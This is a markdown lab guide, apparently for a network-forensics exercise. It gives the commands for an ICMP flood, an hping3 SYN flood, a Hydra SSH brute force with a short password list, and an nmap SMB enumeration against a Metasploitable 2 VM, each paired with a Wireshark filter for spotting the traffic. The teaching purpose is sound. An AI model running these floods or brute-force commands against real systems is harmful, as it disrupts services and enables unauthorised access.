# Traffic Generation Commands

## Safety Scope

These commands must only be executed inside an isolated lab environment against machines you own or are authorized to test. In this project, the target was an intentionally vulnerable Metasploitable 2 VM.

| Machine | IP |
|---|---:|
| Kali Linux Attacker | `192.168.1.4` |
| Metasploitable 2 Victim | `192.168.1.3` |

## 1. ICMP Baseline Connectivity

```bash
ping -c 5 192.168.1.3
```

### Purpose

This confirms that Kali Linux can reach Metasploitable 2 before attack traffic is generated.

### Expected Evidence

Normal ICMP Echo Request and Echo Reply packets should appear in Wireshark.

---

## 2. ICMP Flood

```bash
sudo timeout 8 ping -f 192.168.1.3
```

### Purpose

Generates a short, controlled ICMP Echo Request storm.

### Expected Evidence

Wireshark should show a dense sequence of ICMP Echo Requests from `192.168.1.4` to `192.168.1.3`.

### Investigation Filter

```text
icmp && ip.dst == 192.168.1.3
```

---

## 3. TCP SYN Flood

```bash
sudo timeout 8 hping3 -S -p 80 --flood 192.168.1.3
```

### Purpose

Generates SYN-only traffic against TCP port `80` on the victim.

### Expected Evidence

Wireshark should show many TCP packets with:

```text
SYN = 1
ACK = 0
Destination Port = 80
```

### Investigation Filter

```text
ip.dst == 192.168.1.3 && tcp.flags.syn == 1 && tcp.flags.ack == 0
```

---

## 4. SSH Brute-Force Simulation

Create a small password list:

```bash
nano pass.txt
```

Example lab-only entries:

```text
admin
password
123456
msfadmin
toor
```

Run Hydra:

```bash
hydra -l msfadmin -P pass.txt -t 4 ssh://192.168.1.3
```

### Purpose

Simulates repeated SSH login attempts.

### Expected Evidence

Wireshark should show repeated short-lived TCP sessions to port `22`.

### Investigation Filter

```text
ip.src == 192.168.1.4 && ip.dst == 192.168.1.3 && tcp.port == 22
```

---

## 5. SMB Enumeration

```bash
sudo nmap -sS -p 139,445 --script smb-os-discovery 192.168.1.3
```

### Purpose

Generates SMB discovery and enumeration traffic against ports `139` and `445`.

### Expected Evidence

Wireshark should show SMB negotiation, session setup, and request/response traffic.

### Investigation Filter

```text
tcp.port == 139 || tcp.port == 445
```

---

## Recommended Execution Order

1. Start tcpdump capture.
2. Run ICMP baseline ping.
3. Run short ICMP flood.
4. Run SMB enumeration.
5. Run SSH brute-force simulation.
6. Run short SYN flood.
7. Stop tcpdump.
8. Open the PCAP in Wireshark.
9. Apply filters and collect screenshots.
